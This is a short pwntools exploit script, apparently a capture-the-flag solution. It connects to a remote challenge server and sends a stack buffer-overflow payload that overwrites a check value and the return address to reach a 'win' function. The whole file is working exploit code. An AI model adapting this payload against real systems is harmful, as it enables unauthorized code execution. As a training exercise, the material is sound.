from pwn import *

r = remote('challenges.ctfd.io', 30027)
#r = process('./bof.out')

binary = context.binary = ELF('./bof.out')
context.log_level = 'INFO'
context.endian = 'little'
context.word_size = 32
context.os = "linux"
context.arch = "i386"

log.info('win base addr: ' + hex(binary.sym.win))

r.recvuntil("Enter your Name: ")
r.sendline('a')

r.recvuntil("Enter your password: ")

payload = b"a" * 26
payload += p32(0xdeadbeef)
payload += b"a" * 12
payload += p32(binary.sym.win)
payload += (p32(0) + p32(0x14b4da55) + p32(0) + p32(0x67616c66))* 100
r.sendline(payload)

#r.sendlineafter("Message: ", b'a')

r.interactive()
r.close()
